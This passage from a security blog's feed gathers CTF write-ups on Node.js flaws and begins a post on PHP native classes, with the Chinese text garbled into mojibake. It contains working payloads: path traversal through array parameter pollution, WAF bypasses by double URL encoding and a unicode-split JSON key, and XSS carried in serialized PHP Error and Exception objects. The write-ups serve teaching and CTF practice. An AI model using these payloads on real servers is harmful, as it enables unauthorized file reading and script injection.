src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668851120660-015dd3fc-8e23-42ce-86ae-08e0a10ec78c.png" alt="image.png"><br>ä»”ç»†é˜…è¯»æºä»£ç åï¼Œæˆ‘å¾ˆç¡®å®šæˆ‘ä»¬ä¼šä½¿ç”¨ http å‚æ•°æ±¡æŸ“ï¼Œå› ä¸ºæ²¡æœ‰æ£€æŸ¥ get å‚æ•°çš„ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸ªæ•°ç»„å¹¶å°è¯•åˆ©ç”¨å¯èƒ½å‘ç”Ÿçš„ä¸å½“è¡Œä¸ºã€‚<br>å‡è®¾æˆ‘ä»¬è¾“å…¥ä»¥ä¸‹æ•°ç»„ï¼š</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]</code></pre><ul><li><strong>ç¬¬ä¸€æ¬¡æ£€æŸ¥</strong>ï¼šif (file.includes(â€˜ â€˜) || file.includes(â€˜/â€˜))</li></ul><p>å½“ includes åº”ç”¨äºæ•°ç»„æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥æ˜¯å¦æœ‰ä¸€ä¸ªå­—æ®µç­‰äºä¼ é€’çš„å‚æ•°ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ä¸ºâ€œâ€å’Œâ€œ/â€ï¼‰ï¼Œè¿™é‡Œä¸º falseï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æˆåŠŸé€šè¿‡æ­¤æ£€æŸ¥</p><ul><li><strong>ç¬¬äºŒæ¬¡æ£€æŸ¥</strong>ï¼šif (!allowedFileType(file))</li></ul><p>æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„ä»£ç ï¼š</p><pre><code class="javascript">function allowedFileType(file) &#123;const format = file.slice(file.indexOf(&#39;.&#39;) + 1);    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;        return true;    &#125;    return false;&#125;</code></pre><p>å®ƒå°†ä» indexOf(â€œ.â€)+1 å¼€å§‹å¯¹æˆ‘ä»¬çš„æ•°ç»„è¿›è¡Œåˆ‡ç‰‡ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œç»“æœå°†æ˜¯æˆ‘ä»¬æ•°ç»„çš„æœ€åä¸€ä¸ªå­—æ®µï¼Œå³â€œjsâ€ï¼Œæˆ‘ä»¬ä¹Ÿå°†é€šè¿‡æ­¤æ£€æŸ¥ï¼š<br>ä»¥ä¸‹è¡Œå°†åˆ é™¤æ•°ç»„çš„æœ€åä¸¤ä¸ªå­—æ®µï¼š</p><pre><code class="javascript">if (file.length &gt; 5) &#123;  file = file.slice(0, 5);&#125;# &quot;Welcome to GeeksforGeeks&quot;.slice(0, 5)  ---&gt; Welcom</code></pre><p>æ‰€ä»¥æˆ‘ä»¬çš„æ•°ç»„å°†å˜æˆï¼š</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;]</code></pre><p>æœ€ååœ¨è§£æè·¯å¾„å returnedFile å°†åŒ…å« /proc/self/cwd/flag.txt</p><pre><code class="javascript">const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);</code></pre><p><strong>æ³¨æ„ï¼š</strong>ç”±äºæˆ‘ä»¬çš„â€œ../../â€å­—æ®µï¼Œå½“å‰ç›®å½•çš„__dirname è¢«å¿½ç•¥ï¼Œè€Œ**/proc/self/cwd**ç­‰åŒäºå½“å‰ç›®å½•ã€‚<br>æ‰€ä»¥æœ€åæˆ‘ä»¬çš„æ•°ç»„å°†è¢«è§£æä¸ºæˆ‘ä»¬æƒ³è¦çš„è·¯å¾„ï¼Œè¿™æ˜¯æœ€ç»ˆçš„æœ‰æ•ˆè½½è·ï¼Œå®ƒåªæ˜¯å¯¹æˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„çš„ä¸€ç§è§£é‡Šï¼š</p><pre><code class="javascript">http://chall.csivit.com:30222/getfile?file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../proc/self/cwd/flag.txt&amp;file[]=.&amp;file[]=js</code></pre><h2 id="corCTF2022-a-simple-waf"><a href="#corCTF2022-a-simple-waf" class="headerlink" title="corCTF2022 a simple waf"></a>corCTF2022 a simple waf</h2><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935506091-1813cc21-6778-4925-9957-d8eec87bba05.png"><br>æŒ‘æˆ˜ä¸ºæˆ‘ä»¬æä¾›äº†<a href="https://github.com/thangpd3160/CTF-Writeup/tree/main/corCTF/2022/simplewaf">æºä»£ç </a>å’Œä¸€ä¸ªDockerfile. ç”±äº Instancer åªåˆ›å»ºä¸€ä¸ªæŒç»­ 3 åˆ†é’Ÿçš„æŒ‘æˆ˜å®ä¾‹ï¼Œè¿™éå¸¸ä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨æä¾›çš„èµ„æºåœ¨æœ¬åœ°æ„å»ºå’Œè°ƒè¯•ä»¥ç©è¿™ä¸ªæŒ‘æˆ˜ã€‚<br>æµè§ˆç½‘ç«™localhost:3456ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„ç½‘é¡µå±•ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935640897-81cac506-2e2f-4d19-ac63-515f73604c5d.png" alt="image.png"><br>è¿™ä¸ªæŒ‘æˆ˜çš„ç›®æ ‡æ˜¯è¯»å–flag.txtæ–‡ä»¶çš„å†…å®¹â€¦â€¦ä½†ä»¥æŸç§æ–¹å¼ç»•è¿‡includes(â€˜flagâ€™)wafçš„æ£€æŸ¥ã€‚æ‰€æœ‰çš„æŒ‘æˆ˜ä»£ç éƒ½å¯ä»¥åœ¨ çœ‹åˆ°main.js</p><pre><code class="javascript">const express = require(&quot;express&quot;);const fs = require(&quot;fs&quot;);const app = express();const PORT = process.env.PORT || 3456;app.use((req, res, next) =&gt; &#123;    if([req.body, req.headers, req.query].some(        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)    )) &#123;        return res.send(&quot;bad hacker!&quot;);    &#125;    next();&#125;);app.get(&quot;/&quot;, (req, res) =&gt; &#123;    try &#123;        res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);        res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());           &#125;    catch(err) &#123;        console.log(err);        res.status(500).send(&quot;Internal server error&quot;);    &#125;&#125;);app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port $&#123;PORT&#125;`));</code></pre><p><strong>åˆ†æ</strong><br>é˜…è¯»æºä»£ç åï¼Œæˆ‘æƒ³åˆ°äº†ä¸¤ä¸ªé—®é¢˜ã€‚</p><ol><li>å¦‚ä½•ç»•è¿‡includesæ¡ä»¶ï¼Ÿï¼ˆç»å¯¹â€¦â€¦æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„ä¸œè¥¿ï¼‰ï¼Œä»¥åŠ</li><li>readFileSyncè¯¥å‡½æ•°å¯ä»¥é‡‡ç”¨ä»€ä¹ˆç±»å‹çš„å‚æ•°æ¥è¯»å–æ–‡ä»¶ï¼Ÿ</li></ol><p>é€šè¿‡åœ¨ Google ä¸Šæœç´¢ï¼Œæˆ‘å‘ç°äº†ä¸€ç¯‡å…³äº<a href="https://ahmed-belkahla.me/post/csictf2020/">NodeJS Bypass Filter CTF</a>çš„æ–‡ç« ï¼Œå®ƒåœ¨æŸäº›æ—¶å€™ç±»ä¼¼äºè¿™ä¸ªæŒ‘æˆ˜ï¼š</p><ul><li>è¿™ä¸¤ä¸ªæŒ‘æˆ˜éƒ½æ²¡æœ‰éªŒè¯è¾“å…¥çš„ç±»å‹ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†è¾“å…¥ä½œä¸ºæ•°ç»„è€Œä¸æ˜¯å­—ç¬¦ä¸²ä¼ é€’ï¼Œå¹¶ä¸”</li><li>è¿™ä¸¤ä¸ªæŒ‘æˆ˜éƒ½éœ€è¦ç»•è¿‡includeså‡½æ•°æ‰èƒ½åˆ°è¾¾æ ‡å¿—ï¼</li></ul><p>å¤ªæ£’äº†ï¼è®¤ä¸ºæˆ‘æ‰¾åˆ°äº†æ­£ç¡®çš„ä½ç½®ï¼Œæˆ‘å°è¯•äº† payload file[]=x&amp;file[]=flag.txtã€‚ä¸å¹¸çš„æ˜¯ï¼Œå®ƒæ— æ³•ç»•è¿‡è¿™ä¸ªæŒ‘æˆ˜çš„waf<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935762043-fff8116b-850a-4c5a-bdcd-db5e94a0d1a8.png" alt="image.png"><br>ä¸ºä»€ä¹ˆå®ƒä¸èƒ½ç»•è¿‡wafï¼Ÿå¥½å§ï¼Œæˆ‘å‘ç°è¿™è¡Œä»£ç çš„æŒ‘æˆ˜ä¹‹é—´æœ‰ä¸€ä¸ªå…³é”®çš„ä¸åŒç‚¹<br>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(â€œflagâ€)<br>simplewafä¸é‡‡ç”¨åŸå§‹è¾“å…¥æ¥æ‰§è¡Œè¾“å…¥éªŒè¯ï¼Œè€Œæ˜¯é¢„å…ˆå°†åŸå§‹è¾“å…¥è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²<strong>ã€‚</strong>å› æ­¤ï¼Œè¯¥includeså‡½æ•°ä»ç„¶å¯ä»¥æ£€æŸ¥è½¬æ¢åçš„å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«flagã€‚<br>è‡³æ­¤ï¼Œæˆ‘æ— è®ºå¦‚ä½•ä¹Ÿæƒ³ä¸å‡ºç»•è¿‡è¿™ä¸ªincludeså‡½æ•°â€¦â€¦æ‰€ä»¥ï¼Œæˆ‘è½¬åˆ°ç¬¬äºŒä¸ªé—®é¢˜ï¼Œçœ‹çœ‹é‚£ä¸ªå‡½æ•°çš„NodeJSæ–‡æ¡£ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789510-8354252a-f6cc-463c-b632-bb7e60a1a1de.png" alt="image.png"><br>å¥½çš„ï¼Œæ‰€ä»¥è·¯å¾„å‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ª<string> | <Buffer> | <URL> | <integer>. ä½†æ˜¯ï¼Œè¯·æ±‚æŸ¥è¯¢å€¼çš„ç±»å‹å§‹ç»ˆæ˜¯å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¦‚ä½•ä¼ å…¥readFileSyncå‡½æ•° aURLæˆ– anintegeræˆ– a ä»¥å¤–çš„ä»»ä½•å…¶ä»–å†…å®¹stringï¼Ÿ<br>èµ·åˆæƒ³åˆ°ï¼Œæˆ‘å°è¯•å°†å­—ç¬¦ä¸²æ ¼å¼åŒ–ä¸ºURL: <a href="http://localhost:3456/wow.html%E3%80%82%E5%80%92%E9%9C%89%EF%BC%8C%E4%B8%8D%E8%A1%8C~![image.png](NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png)">http://localhost:3456/wow.htmlã€‚å€’éœ‰ï¼Œä¸è¡Œ~![image.png](NodeJsæ¼æ´æ€»ç»“/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png)</a><br>åœæ­¢å¾’åŠ³çš„çŒœæµ‹ï¼Œæˆ‘å†³å®šåœ¨<a href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">github</a>readFileSyncä¸Šçš„ NodeJS æºä»£ç ä¸­ä»”ç»†æŸ¥çœ‹è¯¥åŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789036-6b7a5233-e982-4190-aaae-0a8ffc5c9972.png" alt="image.png"><br>ç¬¬ 469 è¡ŒåŠä»¥ä¸‹çš„ä»£ç ç‰‡æ®µæ‰§è¡Œè¯»å–æ–‡ä»¶è¿‡ç¨‹ï¼Œæ— éœ€æ·±å…¥ç ”ç©¶ã€‚æˆ‘ä»¬éœ€è¦æ·±å…¥ç ”ç©¶çš„è¦ç‚¹æ˜¯ç¬¬ 467 è¡Œçš„ä»£ç ã€‚é€šè¿‡ç ”ç©¶fs.openSyncå‡½æ•°æ¥è·Ÿè¸ªä»£ç ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788506-b6f91f83-3bd6-43ed-ab40-d21fb43b860d.png" alt="image.png"><br>é€šè¿‡è°ƒæŸ¥getValidatedPathåŠŸèƒ½ç»§ç»­å…³æ³¨ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788081-009143b9-094b-470d-b9c8-36f6f3ec9a1c.png" alt="image.png"><br>æŒ‰ä½ä¸æ”¾ï¼Œè¿™é‡Œä¼šå‡ºç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ã€‚å› æ­¤ï¼Œå¦‚æœè¯¥fileURLOrPathå€¼ä¸ä¸º nullï¼Œå¹¶ä¸”å…¶ä¸­æœ‰ existshrefå’Œoriginï¼Œå®ƒå°†è°ƒç”¨ to fileURLToPathï¼Œå°†fileURLOrPathå€¼è½¬æ¢ä¸º URLã€‚è¿™å°±æ˜¯æˆ‘æƒ³è¯´çš„ï¼æˆ‘èƒ½æ„Ÿè§‰åˆ°æˆ‘èµ°çš„è·¯æ˜¯å¯¹çš„ï¼<br>è·å¾—åŠ¨åŠ›ï¼Œæˆ‘ç»§ç»­ç ”ç©¶è¿™ä¸ªfileURLToPathåŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935794727-c8ad1160-3801-48c0-b0d0-625d21dc379a.png" alt="image.png"><br>è¯¥å€¼çš„ä¸€ä¸ªé™„åŠ æ¡ä»¶fileURLOrPathæ˜¯å…¶åè®®å¿…é¡»æ˜¯file:. å…¨éƒ¨æ£€æŸ¥é€šè¿‡åï¼Œä¼šè°ƒç”¨ç›¸åº”çš„å‡½æ•°ä»URLä¸­è·å–è·¯å¾„ã€‚ç”±äºæˆ‘åœ¨ Linux ä¸Šè°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ç»§ç»­ç ”ç©¶è¯¥getPathFromURLPosixåŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935795561-c49c1cd2-acc0-46b6-85c4-db4ded4c9806.png" alt="image.png"><br>å†æ¬¡æ£€æŸ¥æ­¤ä»£ç ç‰‡æ®µï¼šhostnameå¿…é¡»ä¸ºç©ºã€‚ä½†æ˜¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä»¶å€¼å¾—æ³¨æ„çš„äº‹æƒ…ï¼Œå®ƒå°†å¸®åŠ©æˆ‘ä»¬ç»•è¿‡ simplewaf çš„includesæ£€æŸ¥ï¼Œé‚£å°±æ˜¯å®ƒå°†å¯¹<strong>simplewaf</strong>pathnameæ‰§è¡Œ URL è§£ç ä»¥è·å– URLã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬pathnameä» Web åº”ç”¨ç¨‹åºä¼ é€’ä¸€ä¸ªåŒ URL ç¼–ç å€¼ï¼Œå®ƒæœ€ç»ˆå°†æ–‡ä»¶è·¯å¾„å˜æˆçº¯æ–‡æœ¬ã€‚ä½ çŒœæ€ä¹ˆç€ï¼Ÿç”±äºå®¢æˆ·ç«¯ä¼ é€’ç»™includesæ£€æŸ¥çš„å€¼åªæ˜¯ URL è§£ç ä¸€æ¬¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è½»æ¾ç»•è¿‡æ­¤æ£€æŸ¥ã€‚<br>å¥½çš„ï¼Œè®©æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹å°†æœ‰æ•ˆå‚æ•°fileä½œä¸º URLä¼ é€’ç»™å‡½æ•°readFileSyncéœ€è¦åšçš„æ‰€æœ‰äº‹æƒ…ã€‚</integer></URL></Buffer></string></p><ul><li>fileä¸ä¸ºç©º</li><li>file.originå­˜åœ¨</li><li>file.hrefå­˜åœ¨</li><li>file.protocol = â€˜file:â€™</li><li>file.hostname = â€˜â€™</li></ul><p>ç»•è¿‡wafå¹¶è·å¾—æ ‡å¿—çš„æœ€ç»ˆè¦æ±‚æ˜¯ï¼š</p><ul><li>file.pathnameæ˜¯åŒé‡ URL ç¼–ç </li></ul><p><strong>è§£å†³æ–¹æ¡ˆ</strong><br>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘æ„é€ äº†å¦‚ä¸‹çš„payloadï¼š<br>file[origin]=x&amp;file[href]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fla%2567.txt<br>æˆ‘åªæ˜¯å¯¹å­—ç¬¦è¿›è¡ŒåŒé‡ URL ç¼–ç gä»¥ç»•è¿‡ wafã€‚ä½¿ç”¨æœ‰æ•ˆè½½è·ï¼Œæˆ‘ä»¬æˆåŠŸè·å¾—äº†æµ‹è¯•æ ‡å¿—ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935796021-c337cfb2-2659-429c-aa5d-94fee9e55d4d.png" alt="image.png"><br>å¥½å§ï¼Œå…ˆæ‹¿çœŸæ——å§~<br>corctf{hmm_th4t_waf_w4snt_s0_s1mple}</p><h2 id="ç¥¥äº‘æ¯2022-RUSTwaf"><a href="#ç¥¥äº‘æ¯2022-RUSTwaf" class="headerlink" title="ç¥¥äº‘æ¯2022 RUSTwaf"></a>ç¥¥äº‘æ¯2022 RUSTwaf</h2><pre><code class="javascript">const express = require(&#39;express&#39;);const app = express();const bodyParser = require(&quot;body-parser&quot;)const fs = require(&quot;fs&quot;)app.use(bodyParser.text(&#123;type: &#39;*/*&#39;&#125;));const &#123;  execFileSync &#125; = require(&#39;child_process&#39;);app.post(&#39;/readfile&#39;, function (req, res) &#123;    let body = req.body.toString();    let file_to_read = &quot;app.js&quot;;    const file = execFileSync(&#39;/app/rust-waf&#39;, [body], &#123;        encoding: &#39;utf-8&#39;    &#125;).trim();    try &#123;        file_to_read = JSON.parse(file)    &#125; catch (e)&#123;        file_to_read = file    &#125;    let data = fs.readFileSync(file_to_read);    res.send(data.toString());&#125;);app.get(&#39;/&#39;, function (req, res) &#123;    res.send(&#39;see `/src`&#39;);&#125;);app.get(&#39;/src&#39;, function (req, res) &#123;    var data = fs.readFileSync(&#39;app.js&#39;);    res.send(data.toString());&#125;);app.listen(3000, function () &#123;    console.log(&#39;start listening on port 3000&#39;);&#125;);</code></pre><p>ç›´æ¥/readfileè¯»æºç </p><pre><code class="javascript">use std::env;use serde::&#123;Deserialize, Serialize&#125;;use serde_json::Value;static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;#[derive(Debug, Serialize, Deserialize)]struct File&#123;    #[serde(default = &quot;default_protocol&quot;)]    pub protocol: String,    pub href: String,    pub origin: String,    pub pathname: String,    pub hostname:String&#125;pub fn default_protocol() -&gt; String &#123;    &quot;http&quot;.to_string()&#125;//protocol is default value,can&#39;t be customizedpub fn waf(body: &amp;str) -&gt; String &#123;    if body.to_lowercase().contains(&quot;flag&quot;) ||  body.to_lowercase().contains(&quot;proc&quot;)&#123;        return String::from(&quot;./main.rs&quot;); //è¿™é‡Œé™åˆ¶æˆ‘ä»¬ä¸èƒ½å¸¦æœ‰flagå’Œprocå­—æ®µ    &#125;    if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;        if let Some(json_body_obj) = json_body.as_object() &#123;            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;                return String::from(&quot;./main.rs&quot;);    //è¿™é‡Œé™åˆ¶æˆ‘ä»¬çš„jsonå­—æ®µä¸èƒ½å¸¦æœ‰protocolå­—æ®µï¼Œä½†æ˜¯ä¸‹é¢é™åˆ¶æˆ‘ä»¬æ˜¯fileç»“æ„ä½“ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸€å®šè¦æœ‰protocolå­—æ®µ            &#125;        &#125;        //not contains protocol,check if struct is File        if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) &#123;//é™åˆ¶æˆ‘ä»¬åªèƒ½æ˜¯è¿™ä¸ªç»“æ„ä½“            return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;));        &#125;    &#125; else&#123;        //body not json        return String::from(body);    &#125;    return String::from(&quot;./main.rs&quot;);&#125;fn main() &#123;    let args: Vec&lt;String&gt; = env::args().collect();    println!(&quot;&#123;&#125;&quot;, waf(&amp;args[1]));  //è¿™é‡ŒæŠŠjsonçš„ç¬¬äºŒå­—æ®µä¼ è¿›å»&#125;</code></pre><p>å°†payloadä»¥jsonæ ¼å¼ä¼ ï¼Œä½†æ˜¯è¿™é‡Œç”¨åˆ°çš„payloadä¸­å­˜åœ¨protocolå¯¼è‡´rustèƒ½æ£€æµ‹åˆ°ï¼Œè¦åˆ©ç”¨unicode ç»•è¿‡<br>æœ€ç»ˆpayloadï¼š</p><pre><code class="javascript">&#123;&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/fl%61g&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;origin&quot;:&quot;fuckyou&quot;,&quot;pr\ud800otocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;fuckyou&quot;&#125;</code></pre><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://blog.csdn.net/shawdow_bug/article/details/120072209">https://blog.csdn.net/shawdow_bug/article/details/120072209</a><br><a href="https://xz.aliyun.com/t/11791#toc-8">https://xz.aliyun.com/t/11791#toc-8</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Nodejsè¯­è¨€ç‰¹æ€§&quot;&gt;&lt;a href=&quot;#Nodejsè¯­è¨€ç‰¹æ€§&quot; class=&quot;headerlink&quot; title=&quot;Nodejsè¯­è¨€ç‰¹æ€§&quot;&gt;&lt;/a&gt;Nodejsè¯­è¨€ç‰¹æ€§&lt;/h1&gt;&lt;h2 id=&quot;å¤§å°å†™ç‰¹æ€§&quot;&gt;&lt;a href=&quot;#å¤§å°å†™ç‰¹æ€§&quot; class=&quot;he</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="å¸¸è§æ¼æ´å’Œæ‰‹æ³•" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="node_js" scheme="https://sakurahack-y.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>phpåŸç”Ÿç±»å­¦ä¹ </title>
    <link href="https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-20T03:27:20.000Z</published>
    <updated>2022-11-19T17:57:35.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»"><a href="#æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»" class="headerlink" title="æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»"></a>æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»</h1><p> é€šè¿‡è¿™æ®µä»£ç æŸ¥çœ‹æ–¹æ³•çš„ç±»ï¼Œè¿™é‡Œçœ‹åˆ°__toStringæ–¹æ³•å¯¹åº”çš„Errorç±»  </p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664897701461-e3b768b2-f079-4361-acd3-5955b55ff9e8.png" alt="image.png"></p><h1 id="åˆ©ç”¨Error-Exceptionå†…ç½®ç±»è¿›è¡ŒXSS"><a href="#åˆ©ç”¨Error-Exceptionå†…ç½®ç±»è¿›è¡ŒXSS" class="headerlink" title="åˆ©ç”¨Error/Exceptionå†…ç½®ç±»è¿›è¡ŒXSS"></a>åˆ©ç”¨Error/Exceptionå†…ç½®ç±»è¿›è¡ŒXSS</h1><h2 id="Errorç±»"><a href="#Errorç±»" class="headerlink" title="Errorç±»"></a>Errorç±»</h2><p>åˆ©ç”¨æ¡ä»¶:<br>php7ä»¥ä¸Š<br>å¼€å¯æŠ¥é”™æƒ…å†µä¸‹<br> Errorç±»æ˜¯phpçš„ä¸€ä¸ªå¸¸è§ç±»ï¼Œç”¨äºè‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œå½“ç”¨æˆ·è¾“å…¥é”™è¯¯çš„å€¼ï¼Œå›æ˜¾Erroré¡µé¢ï¼Œphp7ç‰ˆæœ¬ä¼šå­˜åœ¨ç±»ä¼¼çš„XSSæ¼æ´ã€‚Error::__toStringï¼ŒErrorç±»å­˜åœ¨__toStringçš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿›è¡Œç±»å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œå›åº”ï¼Œä¹Ÿå°±æ˜¯echo $l3ifeä¼šæ˜¾ç¤ºä»€ä¹ˆã€‚phpå¯¹è±¡å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºï¼ˆecho $l3ifeï¼‰ä¼šè§¦å‘to_Stringæ–¹æ³•ã€‚ä¸€èˆ¬ç”¨äºååºåˆ—åŒ–æ¼æ´å’ŒXSSæ¼æ´ã€‚<br> æœ¬åœ°åˆ›å»ºerror.php(phpç‰ˆæœ¬è®¾ç½®ä¸º7.0)  </p><pre><code class="php">&lt;?phphighlight_file(&#39;2.php&#39;);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt; </code></pre><p> è¿™æ®µååºåˆ—åŒ–å‡½æ•°ï¼Œå¹¶ä¸å­˜åœ¨è‡ªå®šä¹‰ç±»ï¼Œä¸å¯ä»¥æ‰“ååºåˆ—åŒ–ï¼Œå¯ä»¥ç”¨phpååºåˆ—åŒ–çš„phpå†…ç½®ç±»<br>poc:</p><pre><code class="php">&lt;?php    $a=new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898216896-e958dd71-080f-4d98-a8be-e70d8af6f2e2-16688788988219.png" alt="image.png"></p><h2 id="Exceptionç±»"><a href="#Exceptionç±»" class="headerlink" title="Exceptionç±»"></a>Exceptionç±»</h2><p>åˆ©ç”¨æ¡ä»¶:<br>php5ã€php7<br>å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt;</code></pre><p>poc:</p><pre><code class="php">&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898394442-c162fce3-1be4-4c2f-8ad0-7e17fc82993f.png" alt="image.png"></p><h2 id="BJDCTF-2nd-xssä¹‹å…‰"><a href="#BJDCTF-2nd-xssä¹‹å…‰" class="headerlink" title="[BJDCTF 2nd]xssä¹‹å…‰"></a><strong>[BJDCTF 2nd]xssä¹‹å…‰</strong></h2><p> é€šè¿‡gitæ‹¿åˆ°æºç   </p><pre><code class="php">&lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;];Echo 